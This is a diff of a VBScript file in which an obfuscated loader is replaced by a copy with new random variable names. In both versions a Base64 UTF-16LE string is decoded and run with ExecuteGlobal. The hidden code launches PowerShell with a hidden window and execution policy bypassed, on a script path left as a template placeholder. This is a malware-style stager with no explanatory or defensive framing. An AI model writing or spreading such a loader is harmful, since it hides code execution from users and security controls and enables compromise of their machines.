@@ -1,24 +1,24 @@
-Dim kqpbdnsu
-kqpbdnsu = ""
-kqpbdnsu = kqpbdnsu & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEMAbQBkAAoA"
-kqpbdnsu = kqpbdnsu & "UwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAA"
-kqpbdnsu = kqpbdnsu & "dAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAA"
-kqpbdnsu = kqpbdnsu & "LQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8A"
-kqpbdnsu = kqpbdnsu & "dwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkA"
-kqpbdnsu = kqpbdnsu & "cABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAEQAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUA"
-kqpbdnsu = kqpbdnsu & "IgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAA"
-kqpbdnsu = kqpbdnsu & "bwBTAGgAZQBsAGwAIAA9ACAATgBvAHQAaABpAG4AZwA="
-Dim blpedxnx
-Set blpedxnx = CreateObject("ADODB.Stream")
-blpedxnx.Type = 1
-blpedxnx.Open
+Dim ehtupkdl
+ehtupkdl = ""
+ehtupkdl = ehtupkdl & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEMAbQBk"
+ehtupkdl = ehtupkdl & "AAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMA"
+ehtupkdl = ehtupkdl & "cgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAu"
+ehtupkdl = ehtupkdl & "AGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAA"
+ehtupkdl = ehtupkdl & "LQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABv"
+ehtupkdl = ehtupkdl & "AGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAEQAQQBUAEUAUgBfAFAA"
+ehtupkdl = ehtupkdl & "UwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAs"
+ehtupkdl = ehtupkdl & "ACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwAIAA9ACAATgBvAHQAaABpAG4AZwA="
+Dim fmulmnnr
+Set fmulmnnr = CreateObject("ADODB.Stream")
+fmulmnnr.Type = 1
+fmulmnnr.Open
 Dim _xn : Set _xn = CreateObject("MSXml2.DOMDocument").createElement("z")
 _xn.dataType = "bin.base64"
-_xn.text = kqpbdnsu
-blpedxnx.Write _xn.nodeTypedValue
-blpedxnx.Position = 0
-blpedxnx.Type = 2
-blpedxnx.Charset = "UTF-16LE"
-Dim szifzsha : szifzsha = blpedxnx.ReadText
-blpedxnx.Close
-ExecuteGlobal szifzsha
+_xn.text = ehtupkdl
+fmulmnnr.Write _xn.nodeTypedValue
+fmulmnnr.Position = 0
+fmulmnnr.Type = 2
+fmulmnnr.Charset = "UTF-16LE"
+Dim mbnbeqkz : mbnbeqkz = fmulmnnr.ReadText
+fmulmnnr.Close
+ExecuteGlobal mbnbeqkz
